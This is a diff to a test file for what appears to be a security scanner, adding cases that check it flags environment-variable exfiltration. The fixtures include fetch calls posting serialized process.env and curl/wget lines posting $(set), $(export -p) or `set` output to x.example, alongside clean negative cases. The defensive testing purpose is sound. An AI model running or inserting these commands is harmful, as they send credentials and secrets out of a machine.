@@ -20,6 +20,11 @@ test("a whole environment spread into a JSON body is serialized", () => {
     "await fetch(URL, { body: JSON.stringify({ ...process.env, EXTRA: 1 }) });\n",
     "await fetch(URL, { body: JSON.stringify({ EXTRA: 1, ...process.env }) });\n",
     'await fetch(URL, { body: JSON.stringify(process["env"]) });\n',
+    "await fetch(URL, { body: JSON.stringify(process.env, null, 2) });\n",
+    "await fetch(URL, { body: JSON.stringify({ a: { b: 1 }, ...process.env }) });\n",
+    "await fetch(URL, { body: JSON.stringify({ ...process?.env, EXTRA: 1 }) });\n",
+    "await fetch(URL, { body: JSON.stringify(globalThis.process.env) });\n",
+    "await fetch(URL, { body: JSON.stringify(Object.entries(process.env)) });\n",
   ])
     expect({ text, categories: categories("install.mjs", text) }).toEqual({
       text,
@@ -34,6 +39,9 @@ test("a command substitution that prints the environment is serialized", () => {
     'wget -qO- --post-data="$(env)" https://x.example/i\n',
     'curl -d "$(env | base64)" https://x.example/i\n',
     'curl -d "`env`" https://x.example/i\n',
+    'curl -d "$(set)" https://x.example/i\n',
+    'curl -d "$(export -p)" https://x.example/i\n',
+    'wget -qO- --post-data="`set`" https://x.example/i\n',
   ])
     expect({ line, categories: categories("install.sh", line) }).toEqual({
       line,
@@ -45,6 +53,9 @@ test("a local environment spread and a single key stay clean", () => {
   for (const [path, text] of [
     ["spawn.ts", 'spawn("git", ["status"], { env: { ...process.env } });\n'],
     ["single.mjs", "const token = process.env.TOKEN;\n"],
+    ["single.mjs", "const keys = Object.keys(config);\n"],
+    ["install.sh", 'curl -d "$(set -- "$@")" https://x.example/i\n'],
+    ["install.sh", 'curl -d "`date`" https://x.example/i\n'],
     ["prose.md", "This section explains how the scanner works.\n"],
   ] as const)
     expect({ path, categories: categories(path, text) }).toEqual({
